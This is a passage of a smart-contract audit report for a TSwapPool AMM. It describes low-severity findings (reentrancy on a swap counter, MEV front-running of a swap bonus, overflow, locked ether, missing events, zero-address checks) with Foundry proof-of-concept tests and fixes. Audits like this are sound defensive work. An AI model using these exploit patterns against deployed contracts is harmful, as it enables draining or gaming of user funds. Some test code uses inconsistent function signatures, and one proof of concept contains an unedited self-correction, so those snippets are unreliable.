                 ReentrancyAttacker(attacker_contract).reenter();
            }
        }
        return true;
    }

    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract ReentrancyAttacker {
    TSwapPool public immutable pool;
    IERC20 public immutable weth;
    ReentrantToken public immutable reentrantToken;
    uint public reenteredCount = 0;

    constructor(address _pool, address _weth, address _reentrantToken) {
        pool = TSwapPool(_pool);
        weth = IERC20(_weth);
        reentrantToken = ReentrantToken(_reentrantToken);
    }

    function attack() public {
        pool.swapExactInput(address(weth), 0.1 ether, 0, address(this), block.timestamp);
    }

    function reenter() public {
        reenteredCount++;
        pool.swapExactInput(address(weth), 0.1 ether, 0, address(this), block.timestamp);
    }
}

contract ReentrancyTest is Test {
    function test_ReentrancyOnSwapCount() public {
        // 1. Setup
        ERC20 weth = new ERC20("WETH", "WETH");
        ReentrantToken rtk = new ReentrantToken();
        PoolFactory factory = new PoolFactory(address(weth));
        address poolAddr = factory.createPool(address(rtk));
        TSwapPool pool = TSwapPool(poolAddr);
        ReentrancyAttacker attacker = new ReentrancyAttacker(poolAddr, address(weth), address(rtk));
        rtk.setAttackVars(address(attacker), poolAddr);

        // 2. Fund pool and attacker
        weth.mint(poolAddr, 10 ether);
        rtk.mint(poolAddr, 10 ether);
        pool.mint(address(this), 1 ether); // Provide some liquidity
        weth.mint(address(attacker), 5 ether);
        weth.approve(poolAddr, 5 ether);
        vm.prank(address(attacker));
        IERC20(address(weth)).approve(poolAddr, 5 ether);

        // 3. Set swap_count to 9
        for (uint i = 0; i < 9; i++) {
            pool.swapExactInput(address(weth), 1, 0, address(this), block.timestamp);
        }
        assertEq(pool.swap_count(), 9);
        
        // 4. Attacker initiates the re-entrant swap
        vm.startPrank(address(attacker));
        attacker.attack();
        vm.stopPrank();

        // 5. Check state
        // The first call caused a re-entrant call. 
        // Re-entrant call saw count=9 -> incremented to 10 -> triggered reward -> reset to 0.
        // Original call resumed, saw count=0 -> incremented to 1.
        assertEq(pool.swap_count(), 1, "Swap count should be 1 after re-entrancy");
        assertEq(attacker.reenteredCount(), 1, "Attacker should have re-entered once");
    }
}
```

## Suggested Mitigation
Move the swap_count update (and any other accounting variables) _before_ external token transfers, or protect the whole _swap() function with the OpenZeppelin ReentrancyGuard nonReentrant modifier. This preserves the Checks-Effects-Interactions pattern and blocks the demonstrated re-entrancy vector.

## [L-7]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::_swap

## Description
The `_swap` function includes a reward mechanism where the user who performs the 10th swap (`SWAP_COUNT_MAX`) receives a bonus. Since the `swap_count` is public state and all pending transactions are visible in the mempool, this mechanism is highly susceptible to front-running and general MEV (Miner Extractable Value) exploitation. An attacker can monitor the mempool for transactions that would increment `swap_count` to 9. When such a transaction is found, the attacker can submit their own swap transaction with a higher gas fee to ensure it gets processed first, making their swap the 10th and claiming the reward.

## Impact
Because the bonus is fully predictable (every 10th swap) and visible on-chain, MEV bots will reliably capture it. The only harm is that the intended user-incentive is nullified and the bonus is continuously redirected to arbitrageurs; no user funds are directly stolen, but liquidity providers or the protocol treasury subsidise the bot. The economic effect is unfair value extraction rather than a critical loss of funds.

## Proof of Concept
1. The `swap_count` in a TSwap pool is currently 8.
2. A regular user, Alice, submits a swap transaction.
3. An MEV bot monitoring the mempool sees Alice's transaction. It simulates the transaction and sees that it will increment `swap_count` to 9.
4. The bot immediately submits its own small swap transaction with a higher gas price than Alice's.
5. The bot's transaction is mined first, incrementing `swap_count` to 9.
6. Alice's transaction is mined next, incrementing `swap_count` to 10. Alice receives the reward.
7. Correction to PoC: The bot wants to BE the 10th swap. Let's restart.
---
1. The `swap_count` is 9.
2. A regular user, Alice, submits a swap transaction. If executed, she will get the reward.
3. An MEV bot sees Alice's transaction in the mempool.
4. The bot copies Alice's transaction parameters (or uses its own) and submits it with a higher gas price.
5. The bot's transaction is mined first, it becomes the 10th swapper, `swap_count` is incremented to 10 and then reset to 0, and the bot receives the reward.
6. Alice's transaction is then mined. `swap_count` is now 0, so her swap increments it to 1. She receives no reward.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {MockERC20} from "test/utils/MockERC20.sol";
import {MockWETH}  from "test/utils/MockWETH.sol";

contract MEVRewardTest is Test {
    MockERC20 private token;
    MockWETH  private weth;
    TSwapPool private pool;

    address private alice    = address(0xA11CE);
    address private attacker = address(0xB0B);

    function setUp() public {
        token = new MockERC20("TOKEN", "TKN", 18);
        weth  = new MockWETH();

        pool = new TSwapPool(address(token), address(weth), "LP-TOKEN", "LP");

        // seed and approve
        token.mint(address(this), 1_000_000 ether);
        weth.deposit{value: 1_000_000 ether}();
        token.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);

        // add initial liquidity
        pool.deposit(10_000 ether, 10_000 ether);

        // fund users
        token.mint(alice,    100 ether);
        token.mint(attacker, 100 ether);
        vm.deal(alice,    10 ether);
        vm.deal(attacker, 10 ether);
    }

    function testAttackerIsAlwaysTenth() public {
        vm.startPrank(alice);
        token.approve(address(pool), type(uint256).max);
        // Alice innocently performs 9 swaps
        for (uint256 i; i < 9; ++i) {
            pool.swapExactInput(address(token), 1 ether, 1);
        }
        vm.stopPrank();

        uint256 wethBefore = weth.balanceOf(attacker);

        // Attacker performs the 10th swap and harvests the bonus
        vm.startPrank(attacker);
        token.approve(address(pool), type(uint256).max);
        pool.swapExactInput(address(token), 1 ether, 1);
        vm.stopPrank();

        uint256 wethAfter = weth.balanceOf(attacker);

        // The 10th swapper should receive strictly more WETH than the normal quote
        assertGt(wethAfter - wethBefore, pool.getOutputAmountBasedOnInput(address(token), 1 ether), "bonus not captured");
    }
}


## Suggested Mitigation
Remove the deterministic bonus or distribute accumulated rewards pro-rata to liquidity providers. If a user reward must stay, make it non-predictable (e.g., commit-reveal random draw) so it cannot be trivially front-run.

## [L-8]. Integer Overflow issue in TSwapPool::getInputAmountBasedOnOutput

## Description
The mathematical formulas in `TSwapPool` for calculating swap amounts are vulnerable to integer overflows when dealing with large numbers. Functions like `getOutputAmountBasedOnInput` and `getInputAmountBasedOnOutput` multiply token reserve amounts with swap amounts. If the reserves and/or the swap amount are large enough, the intermediate product can exceed the maximum value of `uint256` (`2**256 - 1`). While Solidity 0.8.x protects against silent overflows by reverting the transaction, this behavior constitutes a Denial of Service for legitimate large-volume trades, limiting the pool's usability.

```solidity
// src/TSwapPool.sol:139-140
uint256 numerator = (inputReserve * outputAmount) * 1000;
```

## Impact
If either reserve becomes extremely large (close to 2^200 units) the intermediate multiplication inside `getInputAmountBasedOnOutput` or `getOutputAmountBasedOnInput` can overflow and revert. The revert blocks that single transaction, but does **not** jeopardise the pool’s funds nor the protocol’s integrity. Real-world ERC-20 supplies make such reserve sizes highly improbable, therefore the issue is limited to a theoretical denial-of-service for gigantic trades.

## Proof of Concept
1. Deploy `TSwapPool` with a mock ERC-20 token (`MockERC20`) and WETH9.
2. Mint an extremely large number of pool tokens (e.g. `2**200`) to the caller and transfer them to the pool contract. Send a reasonable amount of WETH (e.g. `1e20`) to the pool as well. No call to `deposit` is required because the overflow occurs before any reserve-ratio checks.
3. Call `getInputAmountBasedOnOutput(address(weth), 1 ether)`.
4. The function computes:
```
numerator = (inputReserve * outputAmount) * 1000
           ≈ (2**200 * 1e18) * 1000  // ≈ 2**260  > 2**256-1
```
5. The multiplication overflows, triggering Solidity 0.8’s built-in `Panic(0x11)` and reverting the call.

This demonstrates that extremely large reserves can make legitimate queries or swaps revert.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract OverflowUnitTest is Test {
    TSwapPool pool;
    MockERC20 poolToken;
    WETH weth;

    function setUp() public {
        weth = new WETH();
        poolToken = new MockERC20("Huge", "HUGE", 18);
        pool = new TSwapPool(address(poolToken), address(weth), "LP-HUGE", "LPH");

        // Provide WETH liquidity.
        weth.deposit{value: 1 ether}();
        weth.transfer(address(pool), 1 ether);

        // Inflate the pool's token reserve to an enormous value.
        uint256 hugeAmount = uint256(1) << 200; // 2**200
        poolToken.mint(address(this), hugeAmount);
        poolToken.transfer(address(pool), hugeAmount);
    }

    function testOverflow() public {
        vm.expectRevert();
        // Querying the input needed for 1 ether WETH will overflow.
        pool.getInputAmountBasedOnOutput(address(weth), 1 ether);
    }
}

## Suggested Mitigation
Keep each reserve below 2**128 (as done in UniswapV2) or refactor the formulas so that division happens before multiplication (e.g. `numerator = inputReserve * 1000; numerator = (numerator * outputAmount) / (outputReserve - outputAmount);`). Alternatively, introduce checked-math libraries that use 512-bit intermediate precision such as `FullMath.mulDiv`.

## [L-9]. Unexpected Eth issue in TSwapPool::NA

## Description
The `TSwapPool` contract does not implement a `payable` fallback or receive function. However, Ether can be forcibly sent to the contract address by another contract that calls `selfdestruct(payable(poolAddress))`. Any Ether sent this way will be permanently locked in the contract, as there is no function to withdraw it.

## Impact
While this does not break the core AMM logic (which uses WETH), it can lead to a permanent loss of funds for any user or contract that inadvertently sends ETH to a pool address. It is a minor issue but indicates a lack of completeness in handling raw Ether.

## Proof of Concept
1. Deploy a `TSwapPool` contract.
2. Deploy a helper contract, `ForceSender`, that has a function to commit `selfdestruct` and forward its ETH balance to a target address.
3. Send 1 ETH to the `ForceSender` contract.
4. Call the function on `ForceSender` to self-destruct, targeting the `TSwapPool` address.
5. The `TSwapPool` contract's balance will now be 1 ETH.
6. There are no functions in `TSwapPool` to recover this ETH, so it is stuck forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract ForceSender {
    receive() external payable {}

    function destroy(address payable target) public {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 token;

    function setUp() public {
        weth = new MockERC20("WETH", "WETH", 18);
        token = new MockERC20("Token", "TKN", 18);
        pool = new TSwapPool(address(token), address(weth), "LP", "LP");
    }

    function test_EthCanBeStuck() public {
        ForceSender sender = new ForceSender();
        uint256 amount = 1 ether;

        // Fund the sender contract
        vm.deal(address(sender), amount);
        assertEq(address(sender).balance, amount);

        // Pool has no ETH initially
        assertEq(address(pool).balance, 0);

        // Force send ETH via selfdestruct
        sender.destroy(payable(address(pool)));

        // The ETH is now locked in the pool contract
        assertEq(address(pool).balance, amount);
    }
}
```

## Suggested Mitigation
Even if a contract is not intended to hold Ether, it's good practice to include a function that allows for the recovery of accidentally sent funds. This function should be protected by an `onlyOwner` modifier. Since this contract has no owner, a new ownership pattern would need to be introduced, or it could be a public-good function that sends the funds to a treasury or designated address.

```solidity
// Add to TSwapPool.sol
// Assumes an Ownable pattern is added to the contract

function withdrawStuckEther() external onlyOwner {
    uint256 balance = address(this).balance;
    require(balance > 0, "No Ether to withdraw");
    payable(owner()).transfer(balance);
}
```

## [L-10]. Event Consistency issue in TSwapPool::withdraw, swapExactInput, swapExactOutput

## Description
The `TSwapPool` summary mentions an event for the `deposit` function, but not for `withdraw` or `swap` operations. These functions execute critical state changes: `withdraw` burns LP tokens and removes liquidity, while `swap` alters the pool's token reserves. Omitting events for these actions makes it very difficult for off-chain services (like analytics sites, portfolio trackers, and block explorers) to monitor protocol activity. This breaks with the established standard for AMMs (e.g., Uniswap's `Burn` and `Swap` events).

## Impact
The lack of crucial events severely hinders the observability and indexability of the protocol. It becomes difficult to build a reliable data analytics layer on top of TSwap, track historical prices and volumes, or for users to easily verify their transaction history. This reduces trust and limits integration with the wider DeFi ecosystem.

## Proof of Concept
1. A user calls `swapExactInput` to trade 100 TOKEN for WETH. The transaction is successful.
2. The user checks a block explorer like Etherscan. They see `Transfer` events for the tokens, but no specific `Swap` event from the pool contract that details the amounts swapped.
3. An analytics platform like Dune or TheGraph tries to index TSwap. Without `Swap` events, it cannot reliably calculate trading volume, fees, or price impact, rendering its data inaccurate.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, Vm} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {WETH} from "./mocks/WETH.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";

contract EventConsistencyTest is Test {
    TSwapPool pool;
    WETH weth;
    MockERC20 token;
    address user = makeAddr("user");

    // The expected Swap event, following Uniswap v2 standard
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

    function setUp() public {
        weth = new WETH();
        token = new MockERC20("Token", "TKN", 18);
        pool = new TSwapPool(address(token), address(weth), "LP", "LP");
        
        token.mint(address(this), 100e18);
        weth.deposit{value: 10e18}();
        token.approve(address(pool), 100e18);
        weth.approve(address(pool), 10e18);
        pool.deposit(100e18, 10e18, 0, 0, address(this), block.timestamp);
    }

    function test_SwapShouldEmitSwapEvent() public {
        uint256 swapAmount = 1e18;
        token.mint(user, swapAmount);
        
        vm.startPrank(user);
        token.approve(address(pool), swapAmount);

        // This test checks if a `Swap` event with the correct signature is emitted.
        // If the event is missing in the TSwapPool implementation, this test will fail.
        vm.expectEmit(true, true, true, true, address(pool));
        emit Swap(msg.sender, 0, swapAmount, 0, 0, user); // Arguments are placeholders

        // This call is expected to emit the `Swap` event.
        pool.swapExactInput(address(token), swapAmount, 0, user, block.timestamp);
    }
}
```

## Suggested Mitigation
Emit corresponding events for all critical state-changing operations. Specifically, add a `Swap` event in the swap functions and a `Burn` event (or `Withdraw`) in the withdraw function. These events should contain indexed arguments for key addresses (`sender`, `to`) and details of the amounts transferred.

```solidity
// In TSwapPool.sol

contract TSwapPool is ERC20 {
    event Swap(
        address indexed sender,
        address indexed to,
        uint amountTokenIn,
        uint amountWethIn,
        uint amountTokenOut,
        uint amountWethOut
    );

    event Burn(
        address indexed sender,
        address indexed to,
        uint amountToken,
        uint amountWeth
    );

    function _swap(...) private {
        // ... swap logic
        emit Swap(msg.sender, to, tokenIn, wethIn, tokenOut, wethOut);
    }

    function withdraw(...) public {
        // ... withdraw logic
        emit Burn(msg.sender, to, amountToken, amountWeth);
    }
}
```

## [L-11]. Unexpected Eth issue in TSwapPool::receive

## Description
The `TSwapPool` contract includes an empty payable `receive()` function: `receive() external payable {}`. While this allows the contract to receive native Ether, there is no corresponding function to manage or withdraw this Ether. Any Ether sent directly to the contract address via a standard transfer (not through a payable function call like `deposit`) will be permanently locked within the contract, as it is not converted to WETH or tracked by the pool's accounting.

## Impact
Users who mistakenly send Ether to the pool contract address will lose their funds forever. This can happen due to user error or incorrect integration by other protocols. While the protocol's core functionality is unaffected, it creates a risk of permanent fund loss for users.

## Proof of Concept
1. A user, intending to interact with the pool, mistakenly sends 1 ETH directly to the `TSwapPool` contract address instead of calling a payable function.
2. The transaction succeeds because of the `receive()` function.
3. The 1 ETH is now held in the contract's native Ether balance.
4. There is no function in `TSwapPool` (e.g., `withdrawEther()`) that allows for the retrieval of this native Ether. The standard `withdraw` function only returns WETH and the pool token. The funds are permanently stuck.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {WETH9} from "./mocks/WETH9.sol";

contract UnexpectedEthTest is Test {
    PoolFactory factory;
    TSwapPool pool;
    WETH9 weth;
    MockERC20 token;
    address user = makeAddr("user");

    function setUp() public {
        weth = new WETH9();
        token = new MockERC20("Test Token", "TTK", 18);
        factory = new PoolFactory(address(weth));
        address poolAddress = factory.createPool(address(token));
        pool = TSwapPool(poolAddress);
    }

    function testEthGetsStuck() public {
        uint256 poolEthBalanceBefore = address(pool).balance;
        assertEq(poolEthBalanceBefore, 0);

        // User mistakenly sends 1 ETH to the pool contract
        vm.startPrank(user);
        (bool success, ) = address(pool).call{value: 1 ether}("");
        assertTrue(success, "ETH transfer failed");
        vm.stopPrank();

        uint256 poolEthBalanceAfter = address(pool).balance;
        assertEq(poolEthBalanceAfter, 1 ether, "Pool did not receive ETH");

        // There is no function to withdraw this native ETH. It is stuck forever.
    }
}
```

## Suggested Mitigation
If the contract is not intended to handle native Ether, the `receive() external payable {}` function should be removed entirely. This will cause any direct Ether transfers to the contract to revert, preventing accidental fund loss. If native Ether handling is desired, the function should be implemented to convert the received Ether into WETH, for example: `function receive() external payable { i_wethToken.deposit{value: msg.value}(); }`.

## [L-12]. Zero Code issue in TSwapPool::constructor

## Description
The `TSwapPool` constructor does not validate that the `poolToken` and `wethToken` addresses are not `address(0)`. The `PoolFactory`'s `createPool` function also fails to validate its `tokenAddress` input. Allowing a pool to be created with a zero address for one of the tokens will result in a permanently broken pool. Any subsequent interactions with this pool (deposits, swaps, withdrawals) will revert when the code attempts to call functions like `balanceOf` or `transferFrom` on the zero address.

## Impact
Users can accidentally or maliciously create dead pools that have wasted the gas for deployment and will cause any interaction attempts to fail. This does not pose a direct risk of fund loss for other pools but clutters the protocol with non-functional contracts and can cause user funds to be lost if they attempt to send tokens to such a pool.

## Proof of Concept
1. A user or script calls `PoolFactory.createPool(address(0))`.
2. The factory does not check the input and proceeds to deploy a new `TSwapPool` with `poolToken` set to `address(0)`.
3. A new pool address is returned and an event is emitted.
4. Any user who tries to interact with this new pool by calling `deposit` or `swap` will have their transaction revert because of the call to the zero address.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PoolFactory.sol";
import "../src/TSwapPool.sol";
import "./mocks/MockERC20.sol";

contract ZeroAddressTest is Test {
    PoolFactory factory;
    MockERC20 weth;

    function setUp() public {
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        factory = new PoolFactory(address(weth));
    }

    function test_createPoolWithZeroAddress() public {
        // This call should ideally revert, but it succeeds.
        address brokenPoolAddress = factory.createPool(address(0));
        assertTrue(brokenPoolAddress != address(0));

        // Any attempt to use this pool will fail.
        TSwapPool brokenPool = TSwapPool(brokenPoolAddress);
        weth.mint(address(this), 10 ether);
        weth.approve(brokenPoolAddress, 10 ether);

        // The deposit will revert because it calls i_poolToken.balanceOf(address(0))
        vm.expectRevert();
        brokenPool.deposit(5 ether, 0);
    }
}
```

## Suggested Mitigation
Add zero-address checks in both the `PoolFactory` and the `TSwapPool` constructor to ensure that valid token addresses are always used.

In `PoolFactory.sol`:
```diff
 function createPool(address tokenAddress) external returns (address) {
+    require(tokenAddress != address(0), "PoolFactory__InvalidTokenAddress");
     require(
         s_pools[tokenAddress] == address(0),
         "PoolFactory__PoolAlreadyExists"
     );
     // ...
 }
```

In `TSwapPool.sol`:
```diff
 constructor(
     address poolToken,
     address wethToken,
     string memory liquidityTokenName,
     string memory liquidityTokenSymbol
 ) ERC20(liquidityTokenName, liquidityTokenSymbol) {
+    require(poolToken != address(0), "TSwapPool__InvalidPoolToken");
+    require(wethToken != address(0), "TSwapPool__InvalidWethToken");
     i_poolToken = IERC20(poolToken);
     i_wethToken = IERC20(wethToken);
 }
```
